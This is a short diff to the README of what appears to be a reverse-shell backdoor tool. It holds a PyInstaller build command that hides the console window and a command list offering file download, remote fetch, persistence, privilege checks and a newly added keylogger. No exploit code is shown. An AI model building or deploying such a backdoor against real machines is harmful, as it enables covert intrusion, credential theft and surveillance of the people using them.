@@ -17,7 +17,7 @@ python -m PyInstaller reverse_shell.py --onefile --noconsole --add-data="assets/
 5. On server, type ```help``` to show commands instructions
 
 ```
-* Shell#~('127.0.0.1', 57029): help
+* Shell#~('127.0.0.1', 64673): help
 Available functions:
 - cd {path} => change host directory
 - download {file} => Download a file from host
@@ -25,7 +25,6 @@ Available functions:
 - persistence => Try acquiring persistence
 - get {url} => Download a remote file
 - isadmin => Check user privileges
+- keylogger start|dump|stop => start the keylogger|dump the log keylog|stop the keylogger
 - exit => quit the service
 ```
-
-To quit the backdoor, type the command ```exit```
